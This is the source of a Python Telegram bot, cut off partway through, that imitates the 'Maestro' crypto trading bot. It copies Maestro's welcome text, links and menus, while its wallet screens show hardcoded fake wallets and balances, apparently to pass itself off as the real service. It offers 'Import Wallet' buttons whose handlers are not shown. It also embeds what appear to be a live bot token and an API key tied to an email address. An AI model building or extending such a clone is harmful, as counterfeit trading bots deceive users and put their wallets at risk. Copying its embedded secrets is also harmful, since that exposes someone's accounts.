import asyncio
import datetime
import json
import re
from threading import Thread
from html import escape

import aiohttp
try:
    from flask import Flask  # type: ignore[import-not-found]
except ImportError:  # pragma: no cover - runtime fallback for environments without Flask
    Flask = None
from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Required for Solana contract-address detection in incoming messages.

if Flask is not None:
    app = Flask(__name__)

    @app.route('/')
    def home():
        return "Bot is alive"

    def run_flask():
        app.run(host='0.0.0.0', port=10000)

    def keep_alive():
        thread = Thread(target=run_flask, daemon=True)
        thread.start()
else:
    def keep_alive():
        return None


BOT_TOKEN = "8663988497:AAHMhdY1IVahs4IWiJqlM6IDS0hQNWs4__w"
ADMIN_CHAT_ID = 8591686357  # <--- REPLACE THIS WITH YOUR ACTUAL TELEGRAM NUMERICAL ID

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
router = Router()

class BotStates(StatesGroup):
    waiting_for_slippage = State()
    waiting_for_gas = State()
    waiting_for_global_slippage = State()

# 1. Regex to isolate a clean Solana contract address from incoming messages
SOLANA_ADDRESS_REGEX = r"[1-9A-HJ-NP-Za-km-z]{32,44}"

# 2. Your newly activated Solscan Pro API Token
SOLSCAN_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjcmVhdGVkQXQiOjE3ODI4NDg0NTMyMDMsImVtYWlsIjoiY29kZWRmeDAxQGdtYWlsLmNvbSIsImFjdGlvbiI6InRva2VuLWFwaSIsImFwaVZlcnNpb24iOiJ2MiIsImlhdCI6MTc4Mjg0ODQ1M30.nvjtdTqWvultWDQjIgtBPHHXUfHfKpugv3qlZSJFgwc"


async def fetch_dexscreener_data(contract_address: str) -> dict:
    """
    Queries Dexscreener's free API for live token price and market cap data.
    This is used by the CA monitor flow so pasted addresses refresh automatically.
    """
    contract_address = (contract_address or "").strip()
    if not contract_address:
        return {"name": "Unknown Token", "symbol": "UNKNOWN", "price": "$0", "market_cap": 0, "mc": "$0", "success": False}

    url = f"https://api.dexscreener.com/latest/dex/tokens/{contract_address}"
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    pairs = data.get("pairs") or []
                    if pairs:
                        primary_pair = pairs[0]
                        base_token = primary_pair.get("baseToken") or {}
                        token_name = base_token.get("name", "Unknown Token")
                        token_symbol = base_token.get("symbol", "UNKNOWN")
                        price_usd = float(primary_pair.get("priceUsd", 0) or 0)
                        fdv = float(primary_pair.get("fdv", 0) or 0)
                        return {
                            "name": token_name,
                            "symbol": token_symbol,
                            "price": f"${price_usd:,.4f}" if price_usd else "$0",
                            "market_cap": fdv,
                            "mc": f"${fdv:,.0f}" if fdv else "$0",
                            "success": True,
                        }
    except Exception as e:
        print(f"Dexscreener connection timeout or parsing error: {e}")

    return {"name": "Unknown Token", "symbol": "UNKNOWN", "price": "$0", "market_cap": 0, "mc": "$0", "success": False}


def _coerce_first(data: dict, *keys):
    if not isinstance(data, dict):
        return None
    for key in keys:
        value = data.get(key)
        if value not in (None, ""):
            return value
    return None


def normalize_token_data(data: dict) -> dict:
    if not isinstance(data, dict):
        return {}

    if isinstance(data.get("data"), dict):
        data = data["data"]
    elif isinstance(data.get("token"), dict):
        data = data["token"]

    return {
        "name": _coerce_first(data, "name", "tokenName", "token_name"),
        "symbol": _coerce_first(data, "symbol", "tokenSymbol", "token_symbol"),
        "price": _coerce_first(data, "price", "priceUsd", "price_usd", "current_price"),
        "market_cap": _coerce_first(data, "marketCap", "market_cap", "mc"),
        "volume_24h": _coerce_first(data, "volume_24h", "volume24h", "volume", "volume_24h_usd"),
    }


async def fetch_token_details(mint_address: str):
    """
    Fetches real-time market data from Solscan and falls back to safe defaults if the API is unavailable.
    """
    mint_address = (mint_address or "").strip()
    if not mint_address:
        return None

    endpoints = [
        (
            "https://pro-api.solscan.io/v2.0/token/meta",
            {"token": SOLSCAN_API_KEY},
            [{"tokenAddress": mint_address}]
        ),
        (
            "https://pro-api.solscan.io/v2.0/token/meta",
            {"token": SOLSCAN_API_KEY, "Authorization": f"Bearer {SOLSCAN_API_KEY}"},
            [{"tokenAddress": mint_address}, {"address": mint_address}]
        ),
        (
            "https://public-api.solscan.io/token/meta",
            {},
            [{"tokenAddress": mint_address}, {"address": mint_address}]
        ),
    ]

    for url, headers, param_variants in endpoints:
        for params in param_variants:
            try:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                    async with session.get(url, headers=headers, params=params) as response:
                        body = await response.text()
                        if response.status == 200:
                            try:
                                res_json = json.loads(body) if body else {}
                            except Exception:
                                res_json = {}

                            if isinstance(res_json, dict):
                                if isinstance(res_json.get("data"), dict):
                                    return normalize_token_data(res_json["data"])
                                if isinstance(res_json.get("token"), dict):
                                    return normalize_token_data(res_json["token"])
                                return normalize_token_data(res_json)
                        else:
                            print(f"Solscan API Connection Status Error: {response.status} for {mint_address}")
            except Exception as e:
                print(f"Failed handling Solscan API request stream: {e}")

    return {
        "name": "Unknown Token",
        "symbol": "UNKNOWN",
        "price": 0.0,
        "market_cap": 0,
        "volume_24h": 0,
        "_fallback": True,
        "_address": mint_address,
    }


def get_token_label(data: dict, mint_address: str) -> str:
    if not data:
        return mint_address[:6] + "..." + mint_address[-4:]

    name = data.get("name") or ""
    symbol = data.get("symbol") or ""
    if name and symbol:
        return f"{name} ({symbol})"
    if name:
        return name
    if symbol:
        return symbol
    return mint_address[:6] + "..." + mint_address[-4:]


def format_token_message(data: dict, mint_address: str) -> str:
    """
    Formats the raw Solscan data fields cleanly into your visual HTML layout template.
    """
    if not data:
        return "❌ Failed to retrieve token data."

    name = data.get("name", "Unknown Token")
    symbol = data.get("symbol", "UNKNOWN")

    price_raw = data.get("price", 0.0)
    price = f"{price_raw:.4f}"

    market_cap_val = int(float(data.get("market_cap", 0)))
    market_cap = f"{market_cap_val:,}"

    volume_val = int(float(data.get("volume_24h", 0)))
    volume = f"{volume_val:,}"

    now = datetime.datetime.now()
    updated_at = now.strftime("%b %d, %Y %H:%M:%S")

    solscan_url = f"https://solscan.io/token/{mint_address}"

    return (
        f"🪙 {name} (${symbol}) <a href='https://t.me/MaestroOfficialTradingBot'>🌟 Referral</a>\n"
        f"<code>{mint_address}</code>\n"
        f"<a href='https://pump.fun'>Pump.fun</a> 🔗 SOL\n\n"
        f"🧢 MC ${market_cap} | 💵 Price ${price}\n"
        f"💧 Liquidity | ${volume}\n"
        f"📌 No Orders\n\n"
        f"💰 <b>Balance</b>\n"
        f"Wallet | {symbol} | SOL\n"
        f"Hellod | 0 (0%) | 0\n\n"
        f"<a href='{solscan_url}'>GT</a> • <a href='{solscan_url}'>DF</a> • <a href='{solscan_url}'>DT</a> • <a href='{solscan_url}'>DS</a> • <a href='{solscan_url}'>DV</a> • <a href='{solscan_url}'>BE</a> • <a href='{solscan_url}'>PF</a>\n"
        f"<a href='{solscan_url}'>PIRB</a> • <a href='{solscan_url}'>PIRB PRO</a> • <a href='{solscan_url}'>SECT</a>\n\n"
        f"🕓 Updated | <i>{updated_at}</i>"
    )


def get_trading_keyboard(user_id=None):
    if user_id is None:
        slippage_value = "10%"
        gas_value = "0.005 SOL"
    else:
        config = USER_CONFIGS.get(user_id) or get_user_data(user_id)
        slippage_value = config.get("slippage", "10%")
        gas_value = config.get("gas", "0.005 SOL")

    builder = InlineKeyboardBuilder()

    builder.button(text="📍 Track", callback_data="track")
    builder.button(text="🔄 SOL", callback_data="sync_sol")
    builder.button(text="↔️ Go to Sell", callback_data="go_to_sell")
    builder.button(text="💳 Hellod 🔄", callback_data="hellod_refresh")
    builder.button(text="🔴 Multi", callback_data="multi")
    builder.button(text="0.01 SOL", callback_data="buy_0.01")
    builder.button(text="0.05 SOL", callback_data="buy_0.05")
    builder.button(text="0.1 SOL", callback_data="buy_0.1")
    builder.button(text="0.2 SOL", callback_data="buy_0.2")
    builder.button(text="0.5 SOL", callback_data="buy_0.5")
    builder.button(text="1 SOL", callback_data="buy_1")
    builder.button(text="Buy X SOL", callback_data="buy_x_sol")
    builder.button(text="Buy X Tokens", callback_data="buy_x_tokens")
    builder.button(text=f"⚙️ Slippage | {slippage_value}", callback_data="slippage")
    builder.button(text=f"⛽️ Gas | {gas_value}", callback_data="gas")
    builder.button(text="⚙️ Snipe", callback_data="snipe")
    builder.button(text="⚙️ Buy Limit", callback_data="buy_limit")

    builder.adjust(2, 1, 2, 3, 3, 2, 2, 2)
    return builder.as_markup()


def get_monitor_keyboard(user_id, mint_address):
    config = USER_CONFIGS.get(user_id) or get_user_data(user_id)
    slippage_value = config.get("slippage", "10%")
    gas_value = config.get("gas", "0.005 SOL")

    builder = InlineKeyboardBuilder()

    builder.button(text="⬅️", callback_data="nav_left")
    builder.button(text="🔄 Refresh", callback_data=f"refresh_track:{mint_address}")
    builder.button(text="➡️", callback_data="nav_right")

    builder.row(
        types.InlineKeyboardButton(
            text="Copy CA 📋",
            copy_text=types.CopyTextButton(text=mint_address),
        ),
        types.InlineKeyboardButton(text="↔️ Go to Buy", callback_data=f"go_to_buy:{mint_address}"),
    )

    builder.row(types.InlineKeyboardButton(text="🔴 Multi", callback_data=f"refresh_track:{mint_address}"))
    builder.row(types.InlineKeyboardButton(text="⚠️ No Balance Detected ⚠️", callback_data="none"))
    builder.row(
        types.InlineKeyboardButton(text=f"⚙️ Slippage | {slippage_value}", callback_data=f"set_slip:{mint_address}"),
        types.InlineKeyboardButton(text=f"⚙️ Gas | {gas_value}", callback_data=f"set_gas:{mint_address}"),
    )

    builder.row(
        types.InlineKeyboardButton(text="Delete ❌", callback_data="delete_monitor"),
        types.InlineKeyboardButton(text="⚙️ Sell Limit", callback_data="set_limit"),
    )

    builder.row(types.InlineKeyboardButton(text="🔙 Return to Main Menu", callback_data="main_menu"))

    builder.adjust(3, 2, 1, 1, 2, 2, 1)
    return builder.as_markup()


def get_main_menu_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="🔗 Chains", callback_data="manage_chains")
    builder.button(text="💳 Wallets", callback_data="manage_wallets")
    builder.button(text="⚙️ Global Settings", callback_data="global_settings_main")
    builder.button(text="🕓 Active Orders", callback_data="active_orders")
    builder.button(text="📈 Positions", callback_data="positions")

    builder.row(
        types.InlineKeyboardButton(text="Hub", url="https://t.me/MaestroOfficialTradingBot"),
        types.InlineKeyboardButton(text="Updates", url="https://t.me/MaestroOfficialTradingBot"),
        types.InlineKeyboardButton(text="X (Twitter)", url="https://x.com"),
        types.InlineKeyboardButton(text="Docs", url="https://x.com"),
    )
    builder.row(
        types.InlineKeyboardButton(text="Support", url="https://t.me/MaestroOfficialTradingBot"),
        types.InlineKeyboardButton(text="More Links", callback_data="more_links"),
    )
    builder.adjust(2, 2, 1, 4, 2)
    return builder.as_markup()


BOT_LINK = "https://t.me/MaestroOfficialTradingBot"
REFERRAL_LINK = BOT_LINK


def popup_alert(status: str, instruction: str, command: str = "/start") -> str:
    return f"{status} {instruction} Use {command}."


FULL_WELCOME_TEXT = (
    "⭐️ <b>Welcome to Maestro, the one-stop solution for all your trading needs!</b>\n\n"
    "🔗 <b>Chains:</b> Enable/disable chains.\n"
    "💳 <b>Wallets:</b> Import or generate wallets.\n"
    "⚙️ <b>Global Settings:</b> Customize the bot.\n"
    "🕓 <b>Active Orders:</b> Active buy/sell limit orders.\n"
    "📈 <b>Positions:</b> Monitor your active trades.\n\n"
    "⚡️ <b>Paste a token CA to trade immediately!</b>\n\n"
    "<a href='https://t.me/MaestroBotsHub'>Hub</a> • "
    "<a href='https://t.me/MaestroSniperUpdates'>Updates</a> • "
    "<a href='https://x.com/MaestroBots'>X (Twitter)</a> • "
    "<a href='https://docs.maestrobots.com/'>Docs</a> • "
    "<a href='https://t.me/MaestroSupport'>Support</a> • "
    "<a href='https://linktr.ee/MaestroBots'>More Links</a>"
)


def wallets_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="SOL", callback_data="wallet_sol"),
            InlineKeyboardButton(text="BSC", callback_data="wallet_bsc"),
            InlineKeyboardButton(text="BASE", callback_data="wallet_base"),
        ],
        [InlineKeyboardButton(text="ETH", callback_data="wallet_eth")],
        [InlineKeyboardButton(text="Return", callback_data="main_menu")],
    ])


def sol_wallet_buttons():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌REMOVE", callback_data="remove_wallet")],
        [
            InlineKeyboardButton(text="Import Wallet", callback_data="import_wallet"),
            InlineKeyboardButton(text="Generate Wallet", callback_data="generate_wallet"),
        ],
        [
            InlineKeyboardButton(text="Collect", callback_data="collect"),
            InlineKeyboardButton(text="Disperse", callback_data="disperse"),
        ],
        [InlineKeyboardButton(text="Return", callback_data="wallets_menu")],
    ])


def get_chain_selector_markup(action_prefix: str):
    builder = InlineKeyboardBuilder()
    builder.button(text="SOL", callback_data=f"{action_prefix}_sol")
    builder.button(text="BSC", callback_data=f"{action_prefix}_bsc")
    builder.button(text="BASE", callback_data=f"{action_prefix}_base")
    builder.button(text="ETH", callback_data=f"{action_prefix}_eth")
    builder.button(text="Return", callback_data="main_welcome_menu")
    builder.adjust(3, 1, 1)
    return builder.as_markup()


def global_settings_menu():
    return get_chain_selector_markup(action_prefix="global_settings")


def sol_settings_buttons():
    builder = InlineKeyboardBuilder()
    builder.button(text="ℹ️ Help", callback_data="sol_settings_help")
    builder.button(text="🖨️ Print", callback_data="sol_settings_print")
    builder.button(text="Return", callback_data="global_settings_main")
    builder.button(text="🟢 Anti-MEV", callback_data="toggle_anti_mev")
    builder.button(text="🔴 Degen Mode 😈", callback_data="toggle_degen_mode")
    builder.button(text="⚙️ Buy", callback_data="config_global_buy")
    builder.button(text="⚙️ Sell", callback_data="config_global_sell")
    builder.button(text="Initial Includes Fees | 🟢 On", callback_data="toggle_initial_fees")
    builder.button(text="Monitor (All Chains) | 🔄 Detailed", callback_data="toggle_monitor_mode")
    builder.button(text="Wallet Selection (All Chains) | 🔄 Single", callback_data="toggle_wallet_selection")
    builder.adjust(3, 2, 2, 1, 1, 1)
    return builder.as_markup()


def get_original_welcome_keyboard():
    builder = InlineKeyboardBuilder()

    builder.button(text="🔗 Chains", callback_data="manage_chains")
    builder.button(text="🇺🇸🇨🇳 Language", callback_data="language")
    builder.button(text="💳 Wallets", callback_data="view_wallet_chains")
    builder.button(text="⚙️ Global Settings", callback_data="global_settings_chains")
    builder.button(text="📡 Signals", callback_data="signals")
    builder.button(text="🧑‍🤝‍🧑 Copytrade", callback_data="copytrade")
    builder.button(text="🕓 Active Orders", callback_data="active_orders")
    builder.button(text="📈 Positions", callback_data="positions")
    builder.button(text="🎯 Auto Snipe", callback_data="auto_snipe")
    builder.button(text="🔀 Bridge", callback_data="bridge")
    builder.button(text="⭐️ Premium", callback_data="premium")
    builder.button(text="💸 Cashback", callback_data="cashback")
    builder.button(text="💰 Referral", callback_data="referral")
    builder.button(text="⚡️ BUY & SELL NOW!", callback_data="buy_sell_now")

    builder.adjust(2, 2, 2, 2, 2, 3, 1)
    return builder.as_markup()


def format_monitor_text(mint_address, token_data=None, remaining_seconds=2160):
    minutes = remaining_seconds // 60
    seconds = remaining_seconds % 60
    timer_str = f"{minutes:02d}:{seconds:02d}"
    solscan_url = f"https://solscan.io/token/{mint_address}"

    token_label = get_token_label(token_data, mint_address)
    if token_data:
        if isinstance(token_data.get("name"), str) and token_data.get("name"):
            token_label = token_data.get("name")
            if isinstance(token_data.get("symbol"), str) and token_data.get("symbol"):
                token_label = f"{token_label} ({token_data.get('symbol')})"

    try:
        price_raw = token_data.get("price", 0.0) if token_data else 0.0
        if isinstance(price_raw, str):
            price_text = price_raw.replace("$", "")
            if price_text:
                price_text = f"{float(price_text):.4f}"
            else:
                price_text = "0.0000"
        else:
            price_text = f"{float(price_raw or 0.0):.4f}"
    except Exception:
        price_text = "0.0000"

    try:
        market_cap_raw = token_data.get("market_cap", token_data.get("mc", 0)) if token_data else 0
        if isinstance(market_cap_raw, str):
            market_cap_text = market_cap_raw.replace("$", "")
            market_cap_text = f"{float(market_cap_text or 0):,.0f}" if market_cap_text else "0"
        else:
            market_cap_text = f"{float(market_cap_raw or 0):,.0f}"
    except Exception:
        market_cap_text = "0"

    return (
        f"🪙 {token_label} ⏱️ {timer_str} <a href='{BOT_LINK}'>🌟 Referral</a>\n\n"
        f"<i>No Detected Balance.</i>\n\n"
        f"📌 No Orders\n\n"
        f"💵 Price <b>${price_text}</b> | MC <b>${market_cap_text}</b>\n"
        f"<a href='{solscan_url}'>GT</a> • <a href='{solscan_url}'>DF</a> • <a href='{solscan_url}'>DT</a> • <a href='{solscan_url}'>DS</a> • <a href='{solscan_url}'>DV</a> • <a href='{solscan_url}'>BE</a> • <a href='{solscan_url}'>PF</a>\n\n"
        f"ℹ️ Click on 🔄 to manually refresh and update the monitor"
    )


async def monitor_countdown_task(bot: Bot, chat_id: int, message_id: int, mint_address: str, token_data=None):
    try:
        remaining = 2160
        while remaining > 0:
            await asyncio.sleep(5)
            remaining -= 5
            try:
                await bot.edit_message_text(
                    text=format_monitor_text(mint_address, token_data, remaining),
                    chat_id=chat_id,
                    message_id=message_id,
                    parse_mode="HTML",
                    reply_markup=get_monitor_keyboard(chat_id, mint_address),
                    disable_web_page_preview=True,
                )
            except Exception:
                break
    except asyncio.CancelledError:
        pass

@router.callback_query(F.data == "language")
async def language_fix(callback: CallbackQuery):
    await callback.message.edit_text(
        "🌐 Language configuration coming soon!",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Return", callback_data="main_menu")]
        ]),
    )
    await callback.answer()


@router.callback_query(F.data.in_({"wallets", "wallets_menu", "wallets_main"}))
async def process_wallets_menu(callback: CallbackQuery):
    text = (
        "<b>PSyTjbVGn1ZC</b>\n"
        "🟢 Default | 🟢 Manual | 💰 0 SOL\n\n"
        "ℹ️ <i>To transfer from a wallet or rename it, click on the wallet name.</i>\n"
        "ℹ️ <i>Enable \"Manual\" for the wallets participating in your manual buys. "
        "Automated buys will be defaulted to your \"Default\" wallet, but you can further "
        "control this through dedicated Signals, Copytrade, and Auto Snipe settings.</i>"
    )

    builder = InlineKeyboardBuilder()

    builder.button(text="ℹ️ Help ↗️", callback_data="wallet_help")
    builder.button(text="Return", callback_data="main_menu")

    builder.button(text="🗄️ Rearrange Wallets", callback_data="rearrange_wallets")

    builder.button(text="Default Wallet | 💳 Sami", callback_data="status_sami")

    builder.button(text="⚙️ Sami", callback_data="config_sami")
    builder.button(text="🟢 Manual", callback_data="toggle_manual_sami")
    builder.button(text="❌", callback_data="delete_wallet_sami")

    builder.button(text="Import Wallet", callback_data="connect_external_sol")
    builder.button(text="Generate Wallet", callback_data="generate_sol_wallet")

    builder.button(text="Collect", callback_data="collect_funds")
    builder.button(text="Disperse", callback_data="disperse_funds")

    builder.adjust(2, 1, 1, 3, 2, 2)

    try:
        await callback.message.edit_text(text=text, parse_mode="HTML", reply_markup=builder.as_markup())
    except Exception as e:
        print(f"Error drawing target wallet matrix layout: {e}")
    await callback.answer()


@router.callback_query(F.data == "wallet_sol")
async def sol_wallet(callback: CallbackQuery):
    wallet_name = "MyWallet"
    wallet_address = "ABC123XYZ"

    text = f"""🔗 SOL

Their wallet name: {wallet_name}
{wallet_address}
🟢 Default | 🟢 Manual | 💰 0 SOL

ℹ️ To transfer from a wallet or rename it, click on the wallet name.
ℹ️ Enable \"Manual\" for the wallets participating in your manual buys. Automated buys will be defaulted to your \"Default\" wallet, but you can further control this through dedicated Signals, Copytrade, and Auto Snipe settings.
"""

    await callback.message.edit_text(text, reply_markup=sol_wallet_buttons())


@router.callback_query(F.data == "remove_wallet")
async def remove_wallet(callback: CallbackQuery):
    await callback.answer(
        popup_alert("Error!", "No wallet is connected yet.", "/start"),
        show_alert=True,
    )

    await callback.message.edit_text(
        "ℹ️ Wallet not found. Please import or generate.",
        reply_markup=sol_wallet_buttons(),
    )


@router.callback_query(F.data == "wallet_eth")
async def eth_wallet(callback: CallbackQuery):
    await sol_wallet(callback)


@router.callback_query(F.data == "wallet_base")
async def base_wallet(callback: CallbackQuery):
    await callback.answer()
    await callback.message.edit_text("Unavailable At the Moment Please Try again")


CHAIN_GLOBAL_SETTINGS = {}


def get_chain_settings(chain: str) -> dict:
    chain_key = (chain or "sol").lower()
    if chain_key not in CHAIN_GLOBAL_SETTINGS:
        CHAIN_GLOBAL_SETTINGS[chain_key] = {
            "anti_mev": True,
            "degen_mode": False,
            "confirm_manual_buy": False,
            "confirm_manual_sell": False,
            "allow_auto_buy": False,
            "allow_auto_sell": False,
            "duplicate_buy": False,
            "duplicate_sell": False,
            "slippage": 10.0,
            "buy_gas_price": 0.005,
            "price_impact": 20,
            "initial_includes_fees": True,
            "monitor_mode": "Detailed",
            "wallet_selection": "Single",
        }
    return CHAIN_GLOBAL_SETTINGS[chain_key]


def get_chain_display_name(chain: str) -> str:
    return (chain or "SOL").upper()


def get_general_settings_keyboard(chain: str):
    settings = get_chain_settings(chain)
    builder = InlineKeyboardBuilder()
    builder.button(text="ℹ️ Help ↗️", url="https://docs.maestrobots.com/global-settings/buy-settings")
    builder.button(text="🖨️ Print", callback_data=f"print:general:{chain.lower()}")
    builder.button(text="Return", callback_data="global_settings_chains")
    builder.button(text=f"{'🟢' if settings['anti_mev'] else '🔴'} Anti-MEV", callback_data=f"toggle_anti_mev:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['degen_mode'] else '🔴'} Degen Mode 😈", callback_data=f"toggle_degen_mode:{chain.lower()}")
    builder.button(text="⚙️ Buy", callback_data=f"config_global_buy:{chain.lower()}")
    builder.button(text="⚙️ Sell", callback_data=f"config_global_sell:{chain.lower()}")
    builder.button(text=f"Initial Includes Fees | {'🟢' if settings['initial_includes_fees'] else '🔴'}", callback_data=f"toggle_initial_fees:{chain.lower()}")
    builder.button(text=f"Monitor (All Chains) | {settings['monitor_mode']}", callback_data=f"toggle_monitor_mode:{chain.lower()}")
    builder.button(text=f"Wallet Selection (All Chains) | {settings['wallet_selection']}", callback_data=f"toggle_wallet_selection:{chain.lower()}")
    builder.adjust(3, 2, 2, 1, 1, 1)
    return builder.as_markup()


def get_buy_settings_keyboard(chain: str):
    settings = get_chain_settings(chain)
    builder = InlineKeyboardBuilder()
    builder.button(text="ℹ️ Help ↗️", url="https://docs.maestrobots.com/global-settings/buy-settings")
    builder.button(text="🖨️ Print", callback_data=f"print:buy:{chain.lower()}")
    builder.button(text="Return", callback_data=f"settings_back:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['confirm_manual_buy'] else '🔴'} Confirm Manual Buy", callback_data=f"toggle_confirm_manual_buy:{chain.lower()}")
    builder.button(text="🔢 Buy KB", callback_data=f"buy_kb:{chain.lower()}")
    builder.button(text=f"Gas Delta | {settings['buy_gas_price']:.3f} Gwei", callback_data=f"buy_gas_delta:{chain.lower()}")
    builder.button(text=f"Price Impact | {settings['price_impact']}%", callback_data=f"price_impact:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['slippage'] > 0 else '🔴'} Slippage | {settings['slippage']}%", callback_data=f"buy_slippage:{chain.lower()}")
    builder.button(text="🔴 Smart Slippage", callback_data=f"buy_smart_slippage:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['allow_auto_buy'] else '🔴'} Allow Auto Buy", callback_data=f"toggle_allow_auto_buy:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['duplicate_buy'] else '🔴'} Duplicate Buy", callback_data=f"toggle_duplicate_buy:{chain.lower()}")
    builder.adjust(3, 2, 2, 1, 1, 2)
    return builder.as_markup()


def get_sell_settings_keyboard(chain: str):
    settings = get_chain_settings(chain)
    builder = InlineKeyboardBuilder()
    builder.button(text="ℹ️ Help ↗️", url="https://docs.maestrobots.com/global-settings/buy-settings")
    builder.button(text="🖨️ Print", callback_data=f"print:sell:{chain.lower()}")
    builder.button(text="Return", callback_data=f"settings_back:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['confirm_manual_sell'] else '🔴'} Confirm Manual Sell", callback_data=f"toggle_confirm_manual_sell:{chain.lower()}")
    builder.button(text="🔢 Sell KB", callback_data=f"sell_kb:{chain.lower()}")
    builder.button(text=f"Gas Delta | {settings['buy_gas_price']:.3f} Gwei", callback_data=f"sell_gas_delta:{chain.lower()}")
    builder.button(text=f"Price Impact | {settings['price_impact']}%", callback_data=f"price_impact:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['slippage'] > 0 else '🔴'} Slippage | {settings['slippage']}%", callback_data=f"sell_slippage:{chain.lower()}")
    builder.button(text="🔴 Smart Slippage", callback_data=f"sell_smart_slippage:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['allow_auto_sell'] else '🔴'} Allow Auto Sell", callback_data=f"toggle_allow_auto_sell:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['duplicate_sell'] else '🔴'} Duplicate Sell", callback_data=f"toggle_duplicate_sell:{chain.lower()}")
    builder.adjust(3, 2, 2, 1, 1, 2)
    return builder.as_markup()


CALL_CHANNELS = {
    "caesarsgambles": {
        "username": "@caesars_gambles",
        "id": "INSERT_ID",
        "label": "🔴 caesars...",
        "url": "https://t.me/caesars_gambles",
    },
    "madapes": {
        "username": "@mad_apes_call",
        "id": "INSERT_ID",
        "label": "🔴 MadApes",
        "url": "https://t.me/mad_apes_call",
    },
    "madapesgambles": {
        "username": "@mad_apes_gambles",
        "id": "INSERT_ID",
        "label": "🔴 MadApe...",
        "url": "https://t.me/mad_apes_gambles",
    },
    "venomcalls": {
        "username": "@venomcalls",
        "id": "INSERT_ID",
        "label": "🔴 Venom",
        "url": "https://t.me/venomcalls",
    },
    "gubblinscalls": {
        "username": "@gubbinscalls",
        "id": "INSERT_ID",
        "label": "🔴 Gubbins...",
        "url": "https://t.me/gubbinscalls",
    },
    "doxxed": {
        "username": "@DoxxedChannel",
        "id": "INSERT_ID",
        "label": "🔴 Doxxed",
        "url": "https://t.me/DoxxedChannel",
    },
}

CHANNEL_SETTINGS_STATE = {}


def get_signals_settings_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="ℹ️ Help ↗️", url="https://docs.maestrobots.com/signals")
    builder.button(text="Return", callback_data="main_menu")
    builder.button(text="Call Channels", callback_data="signals_call_channels")
    builder.button(text="External Signals", callback_data="signals_external")
    builder.button(text="🔴 Maestro DMs", callback_data="signals_maestro_dms")
    builder.button(text="🟢 Scraper", callback_data="signals_scraper")
    builder.adjust(2, 2, 2)
    return builder.as_markup()


def get_call_channels_keyboard(page: int = 0):
    page = max(0, min(page, 1))
    channel_items = list(CALL_CHANNELS.items())
    start = page * 3
    visible_channels = channel_items[start:start + 3]
    builder = InlineKeyboardBuilder()
    builder.button(text="Search", callback_data="search_channels")
    builder.button(text="Return", callback_data="signals")
    for channel_key, channel in visible_channels:
        builder.button(text=channel["label"], callback_data=f"channel_select:{channel_key}")
    if page > 0:
        builder.button(text="⬅️", callback_data=f"call_channels_page:{page - 1}")
    else:
        builder.button(text="⬅️", callback_data="noop")
    if start + 3 < len(channel_items):
        builder.button(text="➡️", callback_data=f"call_channels_page:{page + 1}")
    else:
        builder.button(text="➡️", callback_data="noop")
    builder.adjust(2, 3, 3, 2)
    return builder.as_markup()


def get_channel_settings_keyboard(channel_key: str):
    channel = CALL_CHANNELS[channel_key]
    builder = InlineKeyboardBuilder()
    builder.button(text=f"{channel['username']} ↗️", url=channel["url"])
    builder.button(text="Return", callback_data="signals_call_channels")
    builder.button(text=f"{'🟢' if CHANNEL_SETTINGS_STATE.get(channel_key, {}).get('active', True) else '🔴'} Active", callback_data=f"toggle_channel_active:{channel_key}")
    builder.button(text=f"{'🟢' if CHANNEL_SETTINGS_STATE.get(channel_key, {}).get('degen', False) else '🔴'} Degen Mode", callback_data=f"toggle_channel_degen:{channel_key}")
    builder.button(text="🖨️ Print", callback_data=f"print_channel:{channel_key}")
    builder.adjust(1, 2, 2)
    return builder.as_markup()


def get_general_settings_text(chain: str) -> str:
    chain_name = get_chain_display_name(chain)
    return (
        f"🔗 <b>{chain_name}</b>\n\n"
        "Customize your general settings. Click on ⚙️ Buy or ⚙️ Sell to customize the settings "
        "of your buys and sells respectively.\n\n"
        "ℹ️ Global Settings are common to all of your connected wallets. They dictate the "
        "settings for your manual trades, and serve as default settings for your automated trades.\n"
        "ℹ️ The settings of your automated trades can be further customized to override your "
        "global settings through dedicated Signals, Copytrade, and Auto Snipe settings."
    )


def get_buy_settings_text(chain: str) -> str:
    chain_name = get_chain_display_name(chain)
    return (
        f"🔗 <b>{chain_name}</b>\n\n"
        "Customize the settings of your buys.\n\n"
        "ℹ️ Enable \"Allow Auto Buy\" to generally allow auto-buys through the bot. This won't trigger any auto-buy unless you manually activate a particular Signal, Copytrade or Auto Snipe.\n"
        "ℹ️ The settings of your automated trades can be further customized to override your global settings through dedicated Signals, Copytrade, and Auto Snipe settings."
    )


def get_sell_settings_text(chain: str) -> str:
    chain_name = get_chain_display_name(chain)
    return (
        f"🔗 <b>{chain_name}</b>\n\n"
        "Customize the settings of your sells.\n\n"
        "ℹ️ Enable \"Allow Auto Sell\" to generally allow auto-sells through the bot. This won't trigger any auto-sell unless you manually activate a particular Signal, Copytrade or Auto Snipe.\n"
        "ℹ️ The settings of your automated trades can be further customized to override your global settings through dedicated Signals, Copytrade, and Auto Snipe settings."
    )


SIGNALS_SETTINGS_TEXT = (
